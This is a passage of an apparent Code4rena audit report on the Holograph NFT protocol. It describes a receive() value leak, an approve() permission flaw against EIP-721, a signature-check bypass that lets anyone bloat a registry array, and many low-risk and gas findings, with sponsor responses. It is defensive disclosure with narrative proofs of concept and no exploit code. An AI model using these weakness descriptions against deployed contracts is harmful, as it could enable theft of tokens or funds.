If Holographer is called with no calldata and some msg.value, the call will reach the  receive() function, which does not forward the call down to the implementation.

This can be a serious value leak issue, because the underlying implementation may have valid behavior for handling sending of value. For example, it can mint the next available tokenID and credit it to the user. Since this logic is never reached, the entire msg.value is just leaked.

### Impact

Leak of value when interacting with an NFT using the receive() or fallback() callback. Note that if NFT implements fallback OR receive() function, execution will never reach either of them from the enforcer's receive() function.

### Recommended Mitigation Steps

Funnel receive() empty calls down to the implementation.

**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/468#issuecomment-1306627063):**
 > Receive function will need to be updated to pass value down like the fallback function

**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/468#issuecomment-1306732804):**
 > Upon further thoughts, believe it may qualify as high severity because it is a leak of value without requiring user error.

**[ACC01ADE (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/468#issuecomment-1319569845):**
 > This is intended behavior, `mgs.value` is never leaked directly to custom implementations. For ERC721 there is a direct and secure method of withdrawing that value via the PA1D contract logic.

**[Trust (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/468#issuecomment-1319747993):**
 > Yeah, but the withdrawal in PA1D will split the money between payout addresses. If developer implemented an ERC721 with receive() fallback, this call would be intended for that logic but instead the money is now treated as royalties to payout. 

**[ACC01ADE (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/468#issuecomment-1320921141):**
 > Developer can implement custom payable functions that guarantee msg.value transfer to their custom implementation. Receive function is reserved for royalty payouts that directly send funds to contract address. Plus it’s expected to be limited to 21k gas units, so there is no real use case where any logic can be accomplished with that much gas.

**[ACC01ADE (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/468#issuecomment-1322294719):**
 > That being said, this is a valid issue and sponsor confirms it. There is no clearly communicated code/documentation that explains this limitation to developers. Will make an attempt at mitigating this potential issue from happening on custom implementation side by providing clearer language and also adding revert functionality in the receive functions to get the attention of developers that might have missed this.

**[ACC01ADE (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/468#ref-pullrequest-1452472274):**
 > [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)



***

## [[M-19] `HolographERC721.approve` not EIP-721 compliant](https://github.com/code-423n4/2022-10-holograph-findings/issues/205)
*Submitted by Lambda*

[HolographERC721.sol#L272](https://github.com/code-423n4/2022-10-holograph/blob/24bc4d8dfeb6e4328d2c6291d20553b1d3eff00b/src/enforcer/HolographERC721.sol#L272)<br>

According to EIP-721, we have for `approve`:

```solidity
///  Throws unless `msg.sender` is the current NFT owner, or an authorized
///  operator of the current owner.
```

An operator in the context of EIP-721 is someone who was approved via `setApprovalForAll`:

```solidity
/// @notice Enable or disable approval for a third party ("operator") to manage
///  all of `msg.sender`'s assets
/// @dev Emits the ApprovalForAll event. The contract MUST allow
///  multiple operators per owner.
/// @param _operator Address to add to the set of authorized operators
/// @param _approved True if the operator is approved, false to revoke approval
function setApprovalForAll(address _operator, bool _approved) external;
```

Besides operators, there are also approved addresses for a token (for which `approve` is used). However, approved addresses can only transfer the token, see for instance the `safeTransferFrom` description:

```solidity
/// @dev Throws unless `msg.sender` is the current owner, an authorized
///  operator, or the approved address for this NFT.
```

`HolographERC721` does not distinguish between authorized operators and approved addresses when it comes to the `approve` function. Because `_isApproved(msg.sender, tokenId)` is used there, an approved address can approve another address, which is a violation of the EIP (only authorized operators should be able to do so).

### Proof Of Concept

Bob calls `approve` to approve Alice on token ID 42 (that is owned by Bob). One week later, Bob sees that a malicious address was approved for his token ID 42 (e.g., because Alice got phished) and stole his token. Bob wonders how this is possible, because Alice should not have the permission to approve other addresses. However, becaue `HolographERC721` did not follow EIP-721, it was possible.

### Recommended Mitigation Steps

Follow the EIP, i.e. do not allow approved addresses to approve other addresses.

**[alexanderattar (Holograph) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/205#issuecomment-1307792766):**
 > Originally, this was a design decision, but we will update the highlighted code to follow the ERC721 spec to avoid unknown consequences.

**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/205#issuecomment-1320957930):**
 > Consider as duplicate of [`#203`](https://github.com/code-423n4/2022-10-holograph-findings/issues/203)

**[Lambda (warden) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/205#issuecomment-1322711108):**
 > @gzeon - Isn't this a different issue than [`#203`](https://github.com/code-423n4/2022-10-holograph-findings/issues/203)? Both are related to ERC721 compliance, but they have different causes (wrong `safeTransferFrom` vs. wrong `approve`), very different impacts (failing transfers vs. unintended permissions), and the sponsor will implement different fixes for them (that for instance would not make sense to review together in a fix review)

**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/205#issuecomment-1328124102):**
 > @Lambda - Fair.

**[ACC01ADE (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/205#ref-pullrequest-1452472274):**
 > [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)



***

# Low Risk and Non-Critical Issues

For this contest, 113 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2022-10-holograph-findings/issues/68) by **Rolezn** received the top score from the judge.

*The following wardens also submitted reports: [0xNazgul](https://github.com/code-423n4/2022-10-holograph-findings/issues/480), [0xSmartContract](https://github.com/code-423n4/2022-10-holograph-findings/issues/397), [adriro](https://github.com/code-423n4/2022-10-holograph-findings/issues/113), [Deivitto](https://github.com/code-423n4/2022-10-holograph-findings/issues/492), [lukris02](https://github.com/code-423n4/2022-10-holograph-findings/issues/358), [oyc\_109](https://github.com/code-423n4/2022-10-holograph-findings/issues/314), [RaymondFam](https://github.com/code-423n4/2022-10-holograph-findings/issues/138), [rotcivegaf](https://github.com/code-423n4/2022-10-holograph-findings/issues/422), [\_\_141345\_\_](https://github.com/code-423n4/2022-10-holograph-findings/issues/330), [peiw](https://github.com/code-423n4/2022-10-holograph-findings/issues/417), [Picodes](https://github.com/code-423n4/2022-10-holograph-findings/issues/74), [Rahoz](https://github.com/code-423n4/2022-10-holograph-findings/issues/13), [RaoulSchaffranek](https://github.com/code-423n4/2022-10-holograph-findings/issues/145), [ret2basic](https://github.com/code-423n4/2022-10-holograph-findings/issues/346), [ryshaw](https://github.com/code-423n4/2022-10-holograph-findings/issues/374), [sakman](https://github.com/code-423n4/2022-10-holograph-findings/issues/133), [seyni](https://github.com/code-423n4/2022-10-holograph-findings/issues/22), [Shinchan](https://github.com/code-423n4/2022-10-holograph-findings/issues/280), [sikorico](https://github.com/code-423n4/2022-10-holograph-findings/issues/91), [0xZaharina](https://github.com/code-423n4/2022-10-holograph-findings/issues/224), [Tagir2003](https://github.com/code-423n4/2022-10-holograph-findings/issues/93), [teawaterwire](https://github.com/code-423n4/2022-10-holograph-findings/issues/321), [tnevler](https://github.com/code-423n4/2022-10-holograph-findings/issues/396), [w0Lfrum](https://github.com/code-423n4/2022-10-holograph-findings/issues/191), [Yiko](https://github.com/code-423n4/2022-10-holograph-findings/issues/310), [8olidity](https://github.com/code-423n4/2022-10-holograph-findings/issues/62), [ajtra](https://github.com/code-423n4/2022-10-holograph-findings/issues/472), [Aymen0909](https://github.com/code-423n4/2022-10-holograph-findings/issues/394), [aysha](https://github.com/code-423n4/2022-10-holograph-findings/issues/387), [B2](https://github.com/code-423n4/2022-10-holograph-findings/issues/363), [bin2chen](https://github.com/code-423n4/2022-10-holograph-findings/issues/271), [Bnke0x0](https://github.com/code-423n4/2022-10-holograph-findings/issues/17), [bobirichman](https://github.com/code-423n4/2022-10-holograph-findings/issues/87), [brgltd](https://github.com/code-423n4/2022-10-holograph-findings/issues/458), [catchup](https://github.com/code-423n4/2022-10-holograph-findings/issues/265), [cccz](https://github.com/code-423n4/2022-10-holograph-findings/issues/235), [cdahlheimer](https://github.com/code-423n4/2022-10-holograph-findings/issues/55), [ch0bu](https://github.com/code-423n4/2022-10-holograph-findings/issues/273), [cryptostellar5](https://github.com/code-423n4/2022-10-holograph-findings/issues/327), [csanuragjain](https://github.com/code-423n4/2022-10-holograph-findings/issues/36), [delfin454000](https://github.com/code-423n4/2022-10-holograph-findings/issues/378), [Diana](https://github.com/code-423n4/2022-10-holograph-findings/issues/324), [djxploit](https://github.com/code-423n4/2022-10-holograph-findings/issues/361), [erictee](https://github.com/code-423n4/2022-10-holograph-findings/issues/227), [fatherOfBlocks](https://github.com/code-423n4/2022-10-holograph-findings/issues/129), [Jeiwan](https://github.com/code-423n4/2022-10-holograph-findings/issues/300), [Josiah](https://github.com/code-423n4/2022-10-holograph-findings/issues/442), [KoKo](https://github.com/code-423n4/2022-10-holograph-findings/issues/50), [leosathya](https://github.com/code-423n4/2022-10-holograph-findings/issues/3), [m\_Rassska](https://github.com/code-423n4/2022-10-holograph-findings/issues/501), [martin](https://github.com/code-423n4/2022-10-holograph-findings/issues/207), [mcwildy](https://github.com/code-423n4/2022-10-holograph-findings/issues/117), [mics](https://github.com/code-423n4/2022-10-holograph-findings/issues/88), [nicobevi](https://github.com/code-423n4/2022-10-holograph-findings/issues/420), [peanuts](https://github.com/code-423n4/2022-10-holograph-findings/issues/312), [pedr02b2](https://github.com/code-423n4/2022-10-holograph-findings/issues/326), [rbserver](https://github.com/code-423n4/2022-10-holograph-findings/issues/405), [RedOneN](https://github.com/code-423n4/2022-10-holograph-findings/issues/73), [ReyAdmirado](https://github.com/code-423n4/2022-10-holograph-findings/issues/299), [rvierdiiev](https://github.com/code-423n4/2022-10-holograph-findings/issues/177), [sakshamguruji](https://github.com/code-423n4/2022-10-holograph-findings/issues/389), [saneryee](https://github.com/code-423n4/2022-10-holograph-findings/issues/159), [securerodd](https://github.com/code-423n4/2022-10-holograph-findings/issues/222), [svskaushik](https://github.com/code-423n4/2022-10-holograph-findings/issues/355), [Trust](https://github.com/code-423n4/2022-10-holograph-findings/issues/433), [Waze](https://github.com/code-423n4/2022-10-holograph-findings/issues/333), [0x1f8b](https://github.com/code-423n4/2022-10-holograph-findings/issues/100), [0x52](https://github.com/code-423n4/2022-10-holograph-findings/issues/164), [0x5rings](https://github.com/code-423n4/2022-10-holograph-findings/issues/279), [0xhunter](https://github.com/code-423n4/2022-10-holograph-findings/issues/412), [0xzh](https://github.com/code-423n4/2022-10-holograph-findings/issues/135), [a12jmx](https://github.com/code-423n4/2022-10-holograph-findings/issues/415), [Amithuddar](https://github.com/code-423n4/2022-10-holograph-findings/issues/8), [arcoun](https://github.com/code-423n4/2022-10-holograph-findings/issues/70), [ballx](https://github.com/code-423n4/2022-10-holograph-findings/issues/12), [bulej93](https://github.com/code-423n4/2022-10-holograph-findings/issues/351), [catwhiskeys](https://github.com/code-423n4/2022-10-holograph-findings/issues/237), [caventa](https://github.com/code-423n4/2022-10-holograph-findings/issues/240), [chaduke](https://github.com/code-423n4/2022-10-holograph-findings/issues/247), [Chom](https://github.com/code-423n4/2022-10-holograph-findings/issues/382), [chrisdior4](https://github.com/code-423n4/2022-10-holograph-findings/issues/194), [cloudjunky](https://github.com/code-423n4/2022-10-holograph-findings/issues/161), [cryptphi](https://github.com/code-423n4/2022-10-holograph-findings/issues/303), [cylzxje](https://github.com/code-423n4/2022-10-holograph-findings/issues/470), [d3e4](https://github.com/code-423n4/2022-10-holograph-findings/issues/486), [Diraco](https://github.com/code-423n4/2022-10-holograph-findings/issues/446), [Dravee](https://github.com/code-423n4/2022-10-holograph-findings/issues/221), [durianSausage](https://github.com/code-423n4/2022-10-holograph-findings/issues/19), [francoHacker](https://github.com/code-423n4/2022-10-holograph-findings/issues/393), [Franfran](https://github.com/code-423n4/2022-10-holograph-findings/issues/137), [gianganhnguyen](https://github.com/code-423n4/2022-10-holograph-findings/issues/39), [gogo](https://github.com/code-423n4/2022-10-holograph-findings/issues/46), [hansfriese](https://github.com/code-423n4/2022-10-holograph-findings/issues/334), [i\_got\_hacked](https://github.com/code-423n4/2022-10-holograph-findings/issues/400), [ignacio](https://github.com/code-423n4/2022-10-holograph-findings/issues/471), [imare](https://github.com/code-423n4/2022-10-holograph-findings/issues/121), [JC](https://github.com/code-423n4/2022-10-holograph-findings/issues/500), [JrNet](https://github.com/code-423n4/2022-10-holograph-findings/issues/388), [Jujic](https://github.com/code-423n4/2022-10-holograph-findings/issues/239), [karanctf](https://github.com/code-423n4/2022-10-holograph-findings/issues/284), [KingNFT](https://github.com/code-423n4/2022-10-holograph-findings/issues/156), [kv](https://github.com/code-423n4/2022-10-holograph-findings/issues/269), [Lambda](https://github.com/code-423n4/2022-10-holograph-findings/issues/200), [louhk](https://github.com/code-423n4/2022-10-holograph-findings/issues/317), [lyncurion](https://github.com/code-423n4/2022-10-holograph-findings/issues/439), [malinariy](https://github.com/code-423n4/2022-10-holograph-findings/issues/349), [Margaret](https://github.com/code-423n4/2022-10-holograph-findings/issues/92), [Migue](https://github.com/code-423n4/2022-10-holograph-findings/issues/369), [minhtrng](https://github.com/code-423n4/2022-10-holograph-findings/issues/365), [Ocean\_Sky](https://github.com/code-423n4/2022-10-holograph-findings/issues/302), [PaludoX0](https://github.com/code-423n4/2022-10-holograph-findings/issues/211), and [pashov](https://github.com/code-423n4/2022-10-holograph-findings/issues/401).*

*Note: See warden's [original submission](https://github.com/code-423n4/2022-10-holograph-findings/issues/68) for full details and PoCs on each item below.*

## [01] Missing Checks for Address(0x0) 

Lack of zero-address validation on address parameters may lead to transaction reverts, waste gas, require resubmission of transactions and may even force contract redeployments in certain cases within the protocol.

### Recommended Mitigation Steps

Consider adding explicit zero-address validation on input parameters of address type.

## [02] Use `safetransfer` Instead Of `transfer` 

It is good to add a `require()` statement that checks the return value of token transfers or to use something like OpenZeppelin’s `safeTransfer`/`safeTransferFrom` unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.

For example, Some tokens do not implement the ERC20 standard properly but are still accepted by most code that accepts ERC20 tokens. For example Tether (USDT)'s transfer() and transferFrom() functions do not return booleans as the specification requires, and instead have no return value. When these sorts of tokens are cast to IERC20, their function signatures do not match and therefore the calls made, revert.

### Recommended Mitigation Steps

Consider using `safeTransfer`/`safeTransferFrom` or `require()` consistently.

## [03] Unused `receive()` Function Will Lock Ether In Contract 

If the intention is for the Ether to be used, the function should call another function, otherwise it should revert

### Recommended Mitigation Steps

The function should call another function, otherwise it should revert

## [04] Use `_safeMint` instead of `_mint`

According to openzepplin's ERC721, the use of `_mint` is discouraged, use _safeMint whenever possible.<br>
https://docs.openzeppelin.com/contracts/3.x/api/token/erc721#ERC721-_mint-address-uint256-

### Recommended Mitigation Steps

Use `_safeMint` whenever possible instead of `_mint`

## [05] Missing Contract-existence Checks Before Low-level Calls

Low-level calls return success if there is no code present at the specified address. 

### Recommended Mitigation Steps

In addition to the zero-address checks, add a check to verify that `<address>.code.length > 0`

## [06] Critical Changes Should Use Two-step Procedure

The critical procedures should be two step process.

See similar findings in previous Code4rena contests for reference:<br>
https://code4rena.com/reports/2022-06-illuminate/#2-critical-changes-should-use-two-step-procedure

### Recommended Mitigation Steps

Lack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.

## [07] Low Level Calls With Solidity Version 0.8.14 Can Result In Optimiser Bug

The project contracts in scope are using low level calls with solidity version before 0.8.14 which can result in optimizer bug.<br>
https://medium.com/certora/overly-optimistic-optimizer-certora-bug-disclosure-2101e3f7994d

Simliar findings in Code4rena contests for reference:<br>
https://code4rena.com/reports/2022-06-illuminate/#5-low-level-calls-with-solidity-version-0814-can-result-in-optimiser-bug

### Recommended Mitigation Steps

Consider upgrading to at least solidity v0.8.15.

## [08] Usage of `payable.transfer` can lead to loss of funds 

The funds that are to be sent can be lost. The issues with `transfer()` are outlined here:<br>
https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/

### Recommended Mitigation Steps

Using low-level `call.value(amount)` with the corresponding result check or using the OpenZeppelin `Address.sendValue` is advised:<br>
https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60

## [09] `ecrecover` may return empty address

There is a common issue that ecrecover returns empty (0x0) address when the signature is invalid. function `_verifySigner` should check that before returning the result of ecrecover.

### Recommended Mitigation Steps

See the solution here: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/cryptography/ECDSA.sol#L68

## [10] `HolographFactory.deployHolographableContract()` can overpopulate `HolographRegistry._holographableContracts`

The `require` checks in `HolographFactory.deployHolographableContract()` can easily by bypassed by sending an invalid signature and `signer` = 0x0.

As a result, this will deploy a holographableContract and update the `HolographRegistry` and push an additional item to `HolographRegistry._holographableContracts`.

Due to `_holographableContracts.push(contractAddress);` in `HolographRegistryInterface(registry).setHolographedHashAddress(hash, holographerAddress);`

A malicious user can overpopulate the `_holographableContracts` array with redundant data, increasing gas costs when `_holographableContracts` is iterated through.

### Recommended Mitigation Steps

Implement valid access control on the `HolographFactory.deployHolographableContract()` to ensure only the relevant can deploy

## [11] Event Is Missing Indexed Fields

Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). 

Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.

## [12] Public Functions Not Called By The Contract Should Be Declared External Instead

Contracts are allowed to override their parents’ functions and change the visibility from external to public.

## [13] Constants Should Be Defined Rather Than Using Magic Numbers

## [14] Missing event for critical parameter change

When changing state variables events are not emitted. Emitting events allows monitoring activities with off-chain monitoring tools.

## [15] `require()` / `revert()` Statements Should Have Descriptive Reason Strings

## [16] Implementation contract may not be initialized

OpenZeppelin recommends that the initializer modifier be applied to constructors.<br> 
Per OZs Post implementation contract should be initialized to avoid potential griefs or exploits.<br>
https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/5

## [17]] Large multiples of ten should use scientific notation

Use (e.g. 1e6) rather than decimal literals (e.g. 100000), for better code readability.

## [18] Use of Block.Timestamp

Block timestamps have historically been used for a variety of applications, such as entropy for random numbers (see the Entropy Illusion for further details), locking funds for periods of time, and various state-changing conditional statements that are time-dependent. Miners have the ability to adjust timestamps slightly, which can prove to be dangerous if block timestamps are used incorrectly in smart contracts.
References: SWC ID: 116

### Recommended Mitigation Steps
Block timestamps should not be used for entropy or generating random numbers—i.e., they should not be the deciding factor (either directly or through some derivation) for winning a game or changing an important state.

Time-sensitive logic is sometimes required; e.g., for unlocking contracts (time-locking), completing an ICO after a few weeks, or enforcing expiry dates. It is sometimes recommended to use block.number and an average block time to estimate times; with a 10 second block time, 1 week equates to approximately, 60480 blocks. Thus, specifying a block number at which to change a contract state can be more secure, as miners are unable to easily manipulate the block number.

## [19] Non-usage of specific imports

The current form of relative path import is not recommended for use because it can unpredictably pollute the namespace.<br>
Instead, the Solidity docs recommend specifying imported symbols explicitly.<br>
https://docs.soliditylang.org/en/v0.8.15/layout-of-source-files.html#importing-other-source-files

### Recommended Mitigation Steps

Use specific imports syntax per solidity docs recommendation.

## [20] Lines are too long

Usually lines in source code are limited to 80 characters. Today's screens are much larger so it's reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over 164 characters, the lines below should be split when they reach that length
Reference: https://docs.soliditylang.org/en/v0.8.10/style-guide.html#maximum-line-length

## [21] Use `bytes.concat()`

Solidity version 0.8.4 introduces `bytes.concat()` (vs `abi.encodePacked(<bytes>,<bytes>)`)

### Recommended Mitigation Steps

Use `bytes.concat()` and upgrade to at least Solidity version 0.8.4 if required. 

## [22] Use of `ecrecover` is susceptible to signature malleability

The built-in EVM precompile `ecrecover` is susceptible to signature malleability, which could lead to replay attacks.<br>
References:  https://swcregistry.io/docs/SWC-117,  https://swcregistry.io/docs/SWC-121, and  https://medium.com/cryptronics/signature-replay-vulnerabilities-in-smart-contracts-3b6f7596df57.<br>
While this is not immediately exploitable, this may become a vulnerability if used elsewhere.

### Recommended Mitigation Steps
Consider using OpenZeppelin’s ECDSA library (which prevents this malleability) instead of the built-in function.

## [23] Commented code

### Proof Of Concept

```
  //   function sourceMintBatch(address to, uint224[] calldata tokenIds) external onlySource {
  //     require(tokenIds.length < 1000, "ERC721: max batch size is 1000");
  //     uint32 chain = _chain();
  //     uint256 token;
  //     for (uint256 i = 0; i < tokenIds.length; i++) {
  //       require(!_burnedTokens[token], "ERC721: can't mint burned token");
  //       token = uint256(bytes32(abi.encodePacked(chain, tokenIds[i])));
  //       require(!_burnedTokens[token], "ERC721: can't mint burned token");
  //       _mint(to, token);
  //     }
  //   }

  /**
   * @dev Allows for source smart contract to mint a batch of tokens.
   */
  //   function sourceMintBatch(address[] calldata wallets, uint224[] calldata tokenIds) external onlySource {
  //     require(wallets.length == tokenIds.length, "ERC721: array length missmatch");
  //     require(tokenIds.length < 1000, "ERC721: max batch size is 1000");
  //     uint32 chain = _chain();
  //     uint256 token;
  //     for (uint256 i = 0; i < tokenIds.length; i++) {
  //       token = uint256(bytes32(abi.encodePacked(chain, tokenIds[i])));
  //       require(!_burnedTokens[token], "ERC721: can't mint burned token");
  //       _mint(wallets[i], token);
  //     }
  //   }

  /**
   * @dev Allows for source smart contract to mint a batch of tokens.
   */
  //   function sourceMintBatchIncremental(
  //     address to,
  //     uint224 startingTokenId,
  //     uint256 length
  //   ) external onlySource {
  //     uint32 chain = _chain();
  //     uint256 token;
  //     for (uint256 i = 0; i < length; i++) {
  //       token = uint256(bytes32(abi.encodePacked(chain, startingTokenId)));
  //       require(!_burnedTokens[token], "ERC721: can't mint burned token");
  //       _mint(to, token);
  //       startingTokenId++;
  //     }
  //   }
```
https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/enforcer/HolographERC721.sol#L527-L570

**[alexanderattar (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/68#issuecomment-1309431800):**
 > Well done!



***

# Gas Optimizations

For this contest, 99 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2022-10-holograph-findings/issues/313) by **oyc\_109** received the top score from the judge.

*The following wardens also submitted reports: [Bnke0x0](https://github.com/code-423n4/2022-10-holograph-findings/issues/16), [Rolezn](https://github.com/code-423n4/2022-10-holograph-findings/issues/69), [RedOneN](https://github.com/code-423n4/2022-10-holograph-findings/issues/72), [RaymondFam](https://github.com/code-423n4/2022-10-holograph-findings/issues/140), [karanctf](https://github.com/code-423n4/2022-10-holograph-findings/issues/272), [Diana](https://github.com/code-423n4/2022-10-holograph-findings/issues/301), [Yiko](https://github.com/code-423n4/2022-10-holograph-findings/issues/305), [halden](https://github.com/code-423n4/2022-10-holograph-findings/issues/350), [0xSmartContract](https://github.com/code-423n4/2022-10-holograph-findings/issues/425), [ajtra](https://github.com/code-423n4/2022-10-holograph-findings/issues/428), [m\_Rassska](https://github.com/code-423n4/2022-10-holograph-findings/issues/429), [leosathya](https://github.com/code-423n4/2022-10-holograph-findings/issues/2), [durianSausage](https://github.com/code-423n4/2022-10-holograph-findings/issues/18), [Mathieu](https://github.com/code-423n4/2022-10-holograph-findings/issues/21), [gianganhnguyen](https://github.com/code-423n4/2022-10-holograph-findings/issues/38), [gogo](https://github.com/code-423n4/2022-10-holograph-findings/issues/47), [KoKo](https://github.com/code-423n4/2022-10-holograph-findings/issues/49), [Satyam\_Sharma](https://github.com/code-423n4/2022-10-holograph-findings/issues/59), [Picodes](https://github.com/code-423n4/2022-10-holograph-findings/issues/75), [0x1f8b](https://github.com/code-423n4/2022-10-holograph-findings/issues/101), [adriro](https://github.com/code-423n4/2022-10-holograph-findings/issues/114), [mcwildy](https://github.com/code-423n4/2022-10-holograph-findings/issues/116), [exolorkistis](https://github.com/code-423n4/2022-10-holograph-findings/issues/127), [fatherOfBlocks](https://github.com/code-423n4/2022-10-holograph-findings/issues/128), [Saintcode\_](https://github.com/code-423n4/2022-10-holograph-findings/issues/131), [sakman](https://github.com/code-423n4/2022-10-holograph-findings/issues/132), [zishansami](https://github.com/code-423n4/2022-10-holograph-findings/issues/136), [0xsam](https://github.com/code-423n4/2022-10-holograph-findings/issues/150), [ret2basic](https://github.com/code-423n4/2022-10-holograph-findings/issues/152), [saneryee](https://github.com/code-423n4/2022-10-holograph-findings/issues/158), [Jujic](https://github.com/code-423n4/2022-10-holograph-findings/issues/192), [erictee](https://github.com/code-423n4/2022-10-holograph-findings/issues/226), [vv7](https://github.com/code-423n4/2022-10-holograph-findings/issues/258), [iepathos](https://github.com/code-423n4/2022-10-holograph-findings/issues/267), [Shinchan](https://github.com/code-423n4/2022-10-holograph-findings/issues/278), [martin](https://github.com/code-423n4/2022-10-holograph-findings/issues/285), [ReyAdmirado](https://github.com/code-423n4/2022-10-holograph-findings/issues/298), [Mukund](https://github.com/code-423n4/2022-10-holograph-findings/issues/308), [cryptostellar5](https://github.com/code-423n4/2022-10-holograph-findings/issues/311), [ch0bu](https://github.com/code-423n4/2022-10-holograph-findings/issues/315), [hxzy](https://github.com/code-423n4/2022-10-holograph-findings/issues/316), [Waze](https://github.com/code-423n4/2022-10-holograph-findings/issues/328), [\_\_141345\_\_](https://github.com/code-423n4/2022-10-holograph-findings/issues/329), [Tomio](https://github.com/code-423n4/2022-10-holograph-findings/issues/343), [svskaushik](https://github.com/code-423n4/2022-10-holograph-findings/issues/356), [Pheonix](https://github.com/code-423n4/2022-10-holograph-findings/issues/360), [Dinesh11G](https://github.com/code-423n4/2022-10-holograph-findings/issues/362), [JrNet](https://github.com/code-423n4/2022-10-holograph-findings/issues/370), [B2](https://github.com/code-423n4/2022-10-holograph-findings/issues/371), [ryshaw](https://github.com/code-423n4/2022-10-holograph-findings/issues/376), [delfin454000](https://github.com/code-423n4/2022-10-holograph-findings/issues/380), [i\_got\_hacked](https://github.com/code-423n4/2022-10-holograph-findings/issues/391), [Aymen0909](https://github.com/code-423n4/2022-10-holograph-findings/issues/392), [Metatron](https://github.com/code-423n4/2022-10-holograph-findings/issues/399), [peiw](https://github.com/code-423n4/2022-10-holograph-findings/issues/416), [rotcivegaf](https://github.com/code-423n4/2022-10-holograph-findings/issues/419), [Deivitto](https://github.com/code-423n4/2022-10-holograph-findings/issues/484), [JC](https://github.com/code-423n4/2022-10-holograph-findings/issues/499), [chaduke](https://github.com/code-423n4/2022-10-holograph-findings/issues/6), [ballx](https://github.com/code-423n4/2022-10-holograph-findings/issues/11), [cdahlheimer](https://github.com/code-423n4/2022-10-holograph-findings/issues/23), [dharma09](https://github.com/code-423n4/2022-10-holograph-findings/issues/37), [beardofginger](https://github.com/code-423n4/2022-10-holograph-findings/issues/56), [skyle](https://github.com/code-423n4/2022-10-holograph-findings/issues/58), [aysha](https://github.com/code-423n4/2022-10-holograph-findings/issues/79), [bobirichman](https://github.com/code-423n4/2022-10-holograph-findings/issues/86), [mics](https://github.com/code-423n4/2022-10-holograph-findings/issues/89), [sikorico](https://github.com/code-423n4/2022-10-holograph-findings/issues/90), [Tagir2003](https://github.com/code-423n4/2022-10-holograph-findings/issues/94), [emrekocak](https://github.com/code-423n4/2022-10-holograph-findings/issues/125), [2997ms](https://github.com/code-423n4/2022-10-holograph-findings/issues/126), [0xzh](https://github.com/code-423n4/2022-10-holograph-findings/issues/134), [Franfran](https://github.com/code-423n4/2022-10-holograph-findings/issues/139), [KingNFT](https://github.com/code-423n4/2022-10-holograph-findings/issues/157), [chrisdior4](https://github.com/code-423n4/2022-10-holograph-findings/issues/166), [w0Lfrum](https://github.com/code-423n4/2022-10-holograph-findings/issues/193), [PaludoX0](https://github.com/code-423n4/2022-10-holograph-findings/issues/210), [0xZaharina](https://github.com/code-423n4/2022-10-holograph-findings/issues/225), [catwhiskeys](https://github.com/code-423n4/2022-10-holograph-findings/issues/238), [catchup](https://github.com/code-423n4/2022-10-holograph-findings/issues/266), [0x5rings](https://github.com/code-423n4/2022-10-holograph-findings/issues/274), [peanuts](https://github.com/code-423n4/2022-10-holograph-findings/issues/318), [Olivierdem](https://github.com/code-423n4/2022-10-holograph-findings/issues/344), [bulej93](https://github.com/code-423n4/2022-10-holograph-findings/issues/354), [Amithuddar](https://github.com/code-423n4/2022-10-holograph-findings/issues/359), [djxploit](https://github.com/code-423n4/2022-10-holograph-findings/issues/372), [sakshamguruji](https://github.com/code-423n4/2022-10-holograph-findings/issues/398), [lukris02](https://github.com/code-423n4/2022-10-holograph-findings/issues/406), [0x040](https://github.com/code-423n4/2022-10-holograph-findings/issues/409), [nicobevi](https://github.com/code-423n4/2022-10-holograph-findings/issues/423), [tnevler](https://github.com/code-423n4/2022-10-holograph-findings/issues/424), [lyncurion](https://github.com/code-423n4/2022-10-holograph-findings/issues/436), [cylzxje](https://github.com/code-423n4/2022-10-holograph-findings/issues/465), [0xNazgul](https://github.com/code-423n4/2022-10-holograph-findings/issues/479), [lucacez](https://github.com/code-423n4/2022-10-holograph-findings/issues/481), [rbserver](https://github.com/code-423n4/2022-10-holograph-findings/issues/482), [d3e4](https://github.com/code-423n4/2022-10-holograph-findings/issues/487), [brgltd](https://github.com/code-423n4/2022-10-holograph-findings/issues/496).*

## [G-01] Don't Initialize Variables with Default Value

Uninitialized variables are assigned with the types default value. Explicitly initializing a variable with it's default value costs unnecesary gas.

```
2022-10-holograph/contracts/HolographBridge.sol::380 => uint256 fee = 0;
2022-10-holograph/contracts/HolographOperator.sol::310 => uint256 gasLimit = 0;
2022-10-holograph/contracts/HolographOperator.sol::311 => uint256 gasPrice = 0;
2022-10-holograph/contracts/HolographOperator.sol::781 => for (uint256 i = 0; i < length; i++) {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::564 => for (uint256 i = 0; i < wallets.length; i++) {
